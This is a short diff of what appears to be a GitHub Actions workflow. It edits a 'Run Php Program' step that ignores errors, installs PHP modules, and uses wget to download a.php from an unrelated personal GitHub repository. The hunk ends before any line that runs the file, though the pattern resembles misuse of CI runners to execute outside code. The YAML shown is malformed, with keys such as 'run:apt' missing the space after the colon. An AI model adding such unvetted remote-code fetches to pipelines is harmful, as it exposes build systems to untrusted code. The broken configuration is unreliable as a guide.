@@ -20,8 +20,7 @@ jobs:
         php-version: 7.4
      - name: Run Php Program
         continue-on-error:true
-        run:|
-          apt install php-mysql php-curl
+        run:apt install php-mysql php-curl
           
           
           wget https://github.com/Bvfre/yu/raw/main/a.php
